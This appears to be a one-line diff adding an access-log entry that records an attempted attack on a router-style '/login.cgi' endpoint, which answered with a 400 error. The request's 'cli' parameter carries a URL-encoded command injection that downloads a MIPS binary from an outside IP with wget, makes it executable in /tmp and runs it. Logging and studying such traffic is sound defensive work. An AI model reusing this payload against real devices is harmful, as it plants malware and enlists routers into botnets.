@@ -1,0 +1,1 @@
+190.6.204.123 - - [12/Apr/2020:02:28:55 +0300] "GET /login.cgi?cli=aa%20aa%27;wget%20http://54.38.212.111/leon.mips%20-O%20->%20/tmp/leonn;chmod%20777%20/tmp/leonn;/tmp/leonn%20dlink.mips%27$ HTTP/1.1" 400 150 "-" "-" "tbox/2.0"
